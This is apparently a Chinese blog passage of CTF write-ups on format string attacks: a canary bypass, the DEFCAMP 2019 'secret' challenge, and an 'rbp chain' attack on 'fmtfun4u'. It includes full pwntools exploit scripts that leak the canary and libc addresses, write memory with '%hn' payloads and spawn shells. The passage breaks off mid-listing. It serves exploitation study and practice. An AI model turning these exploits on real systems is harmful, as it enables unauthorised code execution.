<p>亦或是可以透過靜態分析得知</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_10.png" alt=""></p>
<p>我們透過 objdump 得知 stack canary 的位置在 <code>rbp-0x8</code> 的地方</p>
<p><code>0x90 - 0x8 = 136</code></p>
<p>他們之間的關係大概是 canary -&gt; rbp address -&gt; ret address (根據看的方向也可能倒過來)</p>
<p>都知道了之後我們就能來進行拿 shell 的動作啦~</p>
<p>直接跳 one gadget 可以省很多力</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_12.png" alt=""></p>
<p>exploit code:</p>
<p><img src="/img/Format_string_attack/bypass_formatstring_13.png" alt=""></p>
<p>簡單來說 payload 的構成是 <code>junk(136) + canary(8) + rbp_junk(8) + ret_address(8)</code></p>
<p>教學多 call <code>setuid(0)</code> 來確保拿到的權限是 root 但我是在kali 就算了。</p>
<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>這一題是defcamp 2019的題目，邊複習這篇邊解出來了XDD<br>就順便貼上來</p>
<p>checksec:<br><img src="/img/Format_string_attack/defcamp2019_secret_0.png" alt=""></p>
<p>保護幾乎全開，然後有format string 的問題</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_1.png" alt=""></p>
<p>用r2看一下他,<br><code>main</code> 裡面存在format string的問題，<br><img src="/img/Format_string_attack/defcamp2019_secret_2.png" alt=""><br>並且在 <code>secret</code> 裡面存在overflow的問題<br><img src="/img/Format_string_attack/defcamp2019_secret_3.png" alt=""><br>strcmp下面沒有吐出flag的相關程式碼，意思是就算猜對也不會給你答案，所以我們直接拿shell<br><img src="/img/Format_string_attack/defcamp2019_secret_4.png" alt=""></p>
<p>一樣，因為我們要先找到<code>canary</code>的offset才能進行overflow<br>我們透過輸入<br><code>%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|</code><br>取得canary的value</p>
<p>透過 gdb 可以輕易取得leak canary的offset<br><img src="/img/Format_string_attack/defcamp2019_secret_5.png" alt=""></p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_6.png" alt=""></p>
<p>可以知道大概在第15個offset</p>
<p>那因為有長度限制，我們無法一直leak到16以後，</p>
<p>我們現在至少知道了第15個是canary, 第16個是<code>__libc_csu_init</code>的位置</p>
<p>為什麼知道呢？因為每一次執行他的最後1.5個byte都是<code>c40</code>結尾</p>
<p>符合<code>__libc_csu_init</code>的結尾</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_7.png" alt=""></p>
<p>這樣我們就能leak出 <code>program base</code> 了</p>
<p>但除了leak <code>program base</code> 還不夠，我們需要能leak libc address</p>
<p>其實找libc address可以透過他的位址特性—無論前面位址怎麼變最後1.5個byte都不會變</p>
<p>看到最後1.5個byte不會變的位址，再用gdb去看他對應的 function 是什麼</p>
<p>理論上來說 format string 是能leak出 stack 的內容，而 main 的return address<br><code>__libc_start_main</code>也會放在stack內，所以基本上都能leak出來</p>
<p>在第17個offset我們就找到 libc 的 address 了</p>
<p>我們輸入 <code>%15$lx %16$lx %17$lx</code> 之後出現了三個 address</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_8.png" alt=""></p>
<p>我們挑最後一個來看</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_9.png" alt=""></p>
<p>可以看到裡面的記憶體區段屬於libc的區段，所以我們只要把這個位址扣掉 235</p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_10.png" alt=""></p>
<p>就會得到 <code>__libc_start_main</code> 的開頭位址, 在有libc版本的情況下就可以取得libc_base</p>
<p>進一步可以透過one_gadget然後用overflow取得shell</p>
<p>exploit:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def leak_offset(payload):</span><br><span class="line">    io = process(&quot;./pwn_secret&quot;)</span><br><span class="line">    io.recvuntil(&quot;Name: &quot;)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Hillo &quot;)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    io.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(leak_offset)</span><br><span class="line">print autofmt.offset</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">leak_offset = 6</span><br><span class="line">canary_offset = 15</span><br><span class="line">overflow_offset = 0x90-0x8</span><br><span class="line">binELF = ELF(&quot;./secret&quot;)</span><br><span class="line">libcELF = ELF(&quot;./libc-2.29.so&quot;)</span><br><span class="line"></span><br><span class="line">read_got = binELF.got[&#x27;read&#x27;]</span><br><span class="line">printf_got = binELF.got[&#x27;printf&#x27;]</span><br><span class="line">libc_start_main_libc = libcELF.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">leak = &quot;%15$lx&quot; + &quot; &quot; + &quot;%16$lx&quot; + &quot; &quot; + &quot;%17$lx&quot;</span><br><span class="line"></span><br><span class="line">#leak = &quot;|%17$lx|%18$lx|%19$lx|%20$lx|%21$lx&quot;</span><br><span class="line">#leak = &quot;%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|&quot;</span><br><span class="line">io = process(&quot;secret&quot;)</span><br><span class="line">io.recvuntil(&quot;Name: &quot;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(leak)</span><br><span class="line">raw = io.recvline().split(&quot; &quot;)</span><br><span class="line">canary = int(raw[1], 16)</span><br><span class="line">program_base = int(raw[2], 16) - 0xc40</span><br><span class="line">#use gdb to trace in you will find main&#x27;s return address is &lt;libc_start_main + 235&gt;</span><br><span class="line">libc_start_main = int(raw[3], 16) - 235</span><br><span class="line">libc_base = libc_start_main - libc_start_main_libc</span><br><span class="line">log.info(&quot;canary is %x&quot; %canary)</span><br><span class="line">log.info(&quot;program_base is %x&quot; %program_base)</span><br><span class="line">log.info(&quot;libc_start_main is %x&quot; %libc_start_main)</span><br><span class="line">log.info(&quot;libc base is %x&quot; %libc_base)</span><br><span class="line"></span><br><span class="line">one = libc_base + 0xe664b</span><br><span class="line"></span><br><span class="line">overflow = &quot;a&quot;*overflow_offset + p64(canary) + &#x27;bbbbbbbb&#x27;  +p64(one)</span><br><span class="line">print(repr(p64(canary)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;ase: &quot;)</span><br><span class="line">io.sendline(overflow)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>喔還有一點，因為程式有 call <code>alarm</code>，太惱人了，所以我有把他patch成 <code>isnan</code></p>
<p><img src="/img/Format_string_attack/defcamp2019_secret_11.png" alt=""></p>
<p>[2021/01/10 update] </p>
<h1 id="rbp-chain"><a href="#rbp-chain" class="headerlink" title="rbp chain"></a>rbp chain</h1><p>這次的手法比較進階，原本打算 2020 年的目標是看完這個@@<br>無奈真的有點複雜，拖了一年下定決心來好好看看他</p>
<p>這次的練習的題目是 <code>fmtfun4u</code><br>網址:<br><a target="_blank" rel="noopener" href="https://github.com/ss8651twtw/CTF/tree/master/site/csie.ctf.tw/hw4/fmtfun4u">https://github.com/ss8651twtw/CTF/tree/master/site/csie.ctf.tw/hw4/fmtfun4u</a><br>關於 ebp chain 可以看 angelboy 的影片前半段<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=FieppxsupDc">https://www.youtube.com/watch?v=FieppxsupDc</a><br>一樣來看 source code<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void read_input(char *buf,unsigned int size)&#123;</span><br><span class="line">    int ret ;</span><br><span class="line">    ret = __read_chk(0,buf,size,size);</span><br><span class="line">    if(ret &lt;= 0)&#123;</span><br><span class="line">        puts(&quot;read error&quot;);</span><br><span class="line">        _exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if(buf[ret-1] == &#x27;\n&#x27;)</span><br><span class="line">        buf[ret-1] = &#x27;\x00&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char buf[0x10];</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	setvbuf(stdin,0,_IONBF,0);</span><br><span class="line">	setvbuf(stdout,0,_IONBF,0);</span><br><span class="line">	setvbuf(stderr,0,_IONBF,0);</span><br><span class="line">	for(unsigned int i = 4 ; i &gt;= 0 ; i--)&#123;</span><br><span class="line">		printf(&quot;Input:&quot;);</span><br><span class="line">		read_input(buf,0x10);</span><br><span class="line">		printf(buf);</span><br><span class="line">		puts(&quot;&quot;);</span><br><span class="line">		close(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到他把 input 放在 bss 段上而不是一般所熟知的 stack 上，這樣做的意思就是沒辦法透過 leak stack 上的資訊取得<br>input 所在的 offset, 去藉此 overwrite 任意記憶體，但這時候另一個手法出現了<br>雖然我們的 input 是在 bss 上，但 function 的 return address 和 rbp 還是在 stack 上<br>可以透過<code>現在的</code> rbp 去改寫<code>上一個 rbp 的值</code>，透過 <code>%10hn</code> ，類似這樣子去改寫現在 rbp 位置存放的值，就是在改寫 上一個 rbp 的值<br>舉個例子，可以改寫<code>現在的</code> rbp address, 把<code>上一個</code> rbp 的值往上移 8 個 byte, 再針對上一個 <code>rbp</code> 的 address 存放的值進行改寫，這樣子其實就是在改寫<code>上一個</code> function 的 return address</p>
<p>不多說，直接看題目<br>首先我們當然還是先 leak, 我們需要的 offset<br>這邊介紹一個方便找 offset 的方法<br><img src="/img/Format_string_attack/rbp_chain_1.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i in range(1,11):</span><br><span class="line">...     print(&quot;%&quot;+str(i)+&quot;$lx&quot;,end=&#x27;&#x27;)</span><br><span class="line">... </span><br></pre></td></tr></table></figure>
<p>可以這樣子直接貼上找 offset, 看過另一個是直接用 <code>%p</code> 也可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">IO = process(&quot;./fmtfun4u&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_kali&quot;)</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">csu_offset = &quot;%8$lx&quot;</span><br><span class="line">libc_start_main_234 = &quot;%9$lx&quot;</span><br><span class="line">io.sendline(csu_offset + &#x27;|&#x27; + libc_start_main_234)</span><br><span class="line">raw_recv = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">csu = int(raw_recv[0], 16) </span><br><span class="line">libc_start_main = int(raw_recv[1], 16) - 234 </span><br><span class="line">log.info(&quot;csu is 0x%x&quot; %csu)</span><br><span class="line">log.info(&quot;libc_start_main is 0x%x&quot; %libc_start_main)</span><br><span class="line">binbase = csu - 0xa80</span><br><span class="line">libcbase = libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">printf_libc = libcbase + libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line">log.info(&quot;libcbase is 0x%x&quot; %libcbase)</span><br><span class="line">log.info(&quot;printf is 0x%x&quot; %printf_libc)</span><br></pre></td></tr></table></figure>
<p><img src="/img/Format_string_attack/rbp_chain_2.png" alt=""></p>
<p>把 bp 下在 <code>printf</code> 來看看 stack 的架構<br><img src="/img/Format_string_attack/rbp_chain_3.png" alt=""><br>就如圖上所見，我們可以透過改寫一個 address 內部的值，而這個值也是我們可控的</p>
<p>實際應用場景，我們可以更改 input 的次數，從 4 改寫到65535(0xffff)</p>
<p>思路就是，透過更改<code>這一個</code> ret address 所指的地址，把它更改成任意的 address (這邊的目標是存放 i 的 address)，再透過 Format_string_attack 去改寫被我們改寫過的 address 的值 (這邊就是 i 本身的 value)</p>
<p>畫圖來說的話是這樣:<br><img src="/img/Format_string_attack/rbp_chain_4.png" alt=""></p>
<p>把它實作的 code:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fmtfun4u&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_kali&quot;)</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">csu_offset = &quot;%8$lx&quot;</span><br><span class="line">libc_start_main_234 = &quot;%9$lx&quot;</span><br><span class="line">loop_times_offset = &quot;%7$x&quot;</span><br><span class="line">rbp_offset = &quot;%10$lx&quot;</span><br><span class="line">rbp_offset2 = &quot;%39$lx&quot;</span><br><span class="line"># leak text base and libc base address</span><br><span class="line">io.sendline(csu_offset + &#x27;|&#x27; + libc_start_main_234)</span><br><span class="line">raw_recv = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">csu = int(raw_recv[0], 16)</span><br><span class="line">libc_start_main = int(raw_recv[1], 16) - 234</span><br><span class="line">log.info(&quot;csu is 0x%x&quot; %csu)</span><br><span class="line">log.info(&quot;libc_start_main is 0x%x&quot; %libc_start_main)</span><br><span class="line">binbase = csu - 0xa80</span><br><span class="line">libcbase = libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">printf_libc = libcbase + libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line">log.info(&quot;libcbase is 0x%x&quot; %libcbase)</span><br><span class="line">log.info(&quot;printf is 0x%x&quot; %printf_libc)</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"># leak stack address</span><br><span class="line">io.sendline(rbp_offset+&#x27;|&#x27;)</span><br><span class="line">raw_recv2 = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">rsp = int(raw_recv2[0], 16) - 0x110</span><br><span class="line"># loop_times = i</span><br><span class="line">loop_times = int(raw_recv2[0], 16) - 0x100 + 0x4</span><br><span class="line">log.info(&quot;loop_times address is 0x%x&quot; %loop_times)</span><br><span class="line">log.info(&quot;rsp is 0x%x&quot; %rsp)</span><br><span class="line">#io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">def modify(addr, value):</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    x = addr &amp; 0xffff</span><br><span class="line">    payload = &quot;%&quot; + str(x) + &quot;c&quot; + &quot;%10$hn&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hn&quot;</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"># change i to 65535</span><br><span class="line">modify(loop_times, 0xffff)</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>因為它的 read 有長度限制，所以如果要用 <code>%x</code> leak 的話沒辦法一次 leak 完<br>要分兩次才行，如果用 <code>%p</code> 的話則可以一次 leak 完三個我們要的東西<br>把 bp 下在 <code>printf</code> 再來追一次<br><img src="/img/Format_string_attack/rbp_chain_5.png" alt=""><br>這一條是 leak text base 和 libc address 的部分<br>順便說一下 i 的位置問題，因為 i 是 <code>unsigned int</code> 所以他會以 4 byte 的方式儲存, 那他剛好放在高八位的地方<br>因為  stack address 指向的地方是從最後一個 byte (最右邊)算起，所以我們要從右往左數到 i 的值，這是為什麼<br><code>loop_times = int(raw_recv2[0], 16) - 0x100</code> 之外 還要在 <code>+ 0x4</code> 的原因<br><img src="/img/Format_string_attack/rbp_chain_6.png" alt=""><br>這個是 leak stack address 的步驟，可以看到 i 的值在減少了<br><img src="/img/Format_string_attack/rbp_chain_7.png" alt=""><br>這個是在做改寫 address 的步驟，就是我們上圖粉紅色的部分，<code>%10$hn</code> 就是改寫 <code>0x7fffc98f48e8</code> 內的值<br><img src="/img/Format_string_attack/rbp_chain_7-1.png" alt=""><br>順帶附上 stack 的狀態，這是修改前的樣子<br><img src="/img/Format_string_attack/rbp_chain_7-2.png" alt=""><br>修改後的樣子<br><img src="/img/Format_string_attack/rbp_chain_7-3.png" alt=""><br>highlight 一下，可以看到我們把 <code>0x7fffc98f48e8</code> 裡面的記憶體位置改寫成 <code>0x00007fffc98f47ec</code> ，也就是存放 <code>i</code> 的值的位置，所以只要在針對這個位置的值做改寫就可以改寫 <code>i</code>的值<br><img src="/img/Format_string_attack/rbp_chain_8.png" alt=""><br>上面就是在做改寫的動作 <code>%39$hn</code> 對應的就是改寫 <code>0x00007fffc98f47ec</code> 內的值，就是上圖咖啡色的行為<br><img src="/img/Format_string_attack/rbp_chain_9.png" alt=""><br>改寫完成，現在可以無限制的輸入了<br>下一步再回頭來看 stack (我直接拿舊的來改)<br><img src="/img/Format_string_attack/rbp_chain_10.png" alt=""><br>可以看到在 vprintf 的 return address 的下一個位址也是指向一個 stack, 那現在基本上我們可以任意寫 stack 了，綠框的部分就是之前改 i 的值的流程，藍框的部分現在被改成存放 i 的位置了<br>把藍框改到紅框指向的空間寫入 <code>system</code> 的 address,<br>然後把 return address (橘框)改寫成放 <code>ret</code> 的 address, 這樣她會 pop 紅框的值給 rip, 就會再跳過去構好 <code>system</code> 的地方<br>這時候我們再輸入 <code>/bin/sh</code>, rdi 就會是 /bin/sh, 聽起來就可以拿到 shell 了<br>把一系列的動作時做出來:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">io = process(&quot;./fmtfun4u&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_kali&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">csu_offset = &quot;%8$lx&quot;</span><br><span class="line">libc_start_main_234 = &quot;%9$lx&quot;</span><br><span class="line">loop_times_offset = &quot;%7$x&quot;</span><br><span class="line">rbp_offset = &quot;%10$lx&quot;</span><br><span class="line">rbp_offset2 = &quot;%39$lx&quot;</span><br><span class="line"># leak text base and libc base</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(csu_offset + &#x27;|&#x27; + libc_start_main_234)</span><br><span class="line">raw_recv = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">csu = int(raw_recv[0], 16)</span><br><span class="line">libc_start_main = int(raw_recv[1], 16) - 234</span><br><span class="line">log.info(&quot;csu is 0x%x&quot; %csu)</span><br><span class="line">log.info(&quot;libc_start_main is 0x%x&quot; %libc_start_main)</span><br><span class="line">binbase = csu - 0xa80</span><br><span class="line">ret = binbase + 0xae4</span><br><span class="line">libcbase = libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">system = libcbase + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">printf_libc = libcbase + libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line">log.info(&quot;libcbase is 0x%x&quot; %libcbase)</span><br><span class="line">log.info(&quot;printf is 0x%x&quot; %printf_libc)</span><br><span class="line">magic =libcbase + 0xcbcba</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line"># leak stack address</span><br><span class="line">io.sendline(rbp_offset + &#x27;|&#x27; + rbp_offset2)</span><br><span class="line">raw_recv2 = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">rsp = int(raw_recv2[0], 16) - 0x110</span><br><span class="line">rbp_chain_address = int(raw_recv2[1], 16)</span><br><span class="line">loop_times = int(raw_recv2[0], 16) - 0x100 + 0x4</span><br><span class="line">log.info(&quot;loop_times address is 0x%x&quot; %loop_times)</span><br><span class="line">log.info(&quot;rbp chain is 0x%x&quot; %rbp_chain_address)</span><br><span class="line">log.info(&quot;rsp is 0x%x&quot; %(rsp))</span><br><span class="line">def modify(addr: int, value: int, Bytes: int):</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    x = addr &amp; 0xffff</span><br><span class="line">    payload = &quot;%&quot; + str(x) + &quot;c&quot; + &quot;%10$hn&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    if Bytes == 2:</span><br><span class="line">        payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hn&quot;</span><br><span class="line">    if Bytes == 1:</span><br><span class="line">        payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hhn&quot;</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"># change i to 65535</span><br><span class="line">modify(loop_times, 0xffff, 2)</span><br><span class="line">modify((rsp+0x110-0x8), (system&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x110-0x8+2), ((system&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x110-0x8+4), ((system&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp), (ret&amp;0xff), 1)</span><br><span class="line">print(io.recvuntil(&quot;Input:&quot;))</span><br><span class="line">#change_i_time_payload = &quot;%255c&quot; + &quot;%7hn&quot;</span><br><span class="line">#io.sendline(change_i_time_payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><code>0xae4</code>就是 <code>csu</code> 裡面放 <code>ret</code> 指令的 address, 剛好會到 main <code>0xa5c</code> 的 offset, 所以只要改寫 1 byte 就好了<br>另外要注意不管是 <code>(system&amp;0xffff0000) &gt;&gt; 16</code> 或是 <code>(system&amp;0xffff00000000) &gt;&gt; 32</code> 記得都要先把 <code>system&amp;0xffff00</code> 做括弧進行優先計算，不然他會先做 <code>&gt;&gt; 16</code> 然後 payload 就爛了<br><img src="/img/Format_string_attack/rbp_chain_11.png" alt=""><br>實做完原本想說成功了，結果忘記了…<br><img src="/img/Format_string_attack/rbp_chain_12-1.png" alt=""><br>可以看到 RIP 如我所想的跳到 <code>ret</code> 的指令上<br><img src="/img/Format_string_attack/rbp_chain_12-2.png" alt=""><br>可以看到 RIP 如我所想的跳到 <code>ret</code> 的指令上, 再把存有 <code>system</code> 位址的 stack 空間 pop 到 RIP<br><img src="/img/Format_string_attack/rbp_chain_12-3.png" alt=""><br>然後呢? 然後就沒有然後了，他就直接跳進 system 執行了，可以看到這時候我們的 RDI 還沒輸入 <code>/bin/sh</code> 就進去 <code>system</code> 裡面了，就出錯了</p>
<p>於是下一步就是嘗試直接在 stack 構 <code>system(&#39;/bin/sh&#39;)</code></p>
<p>直接附上最終的 exp<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 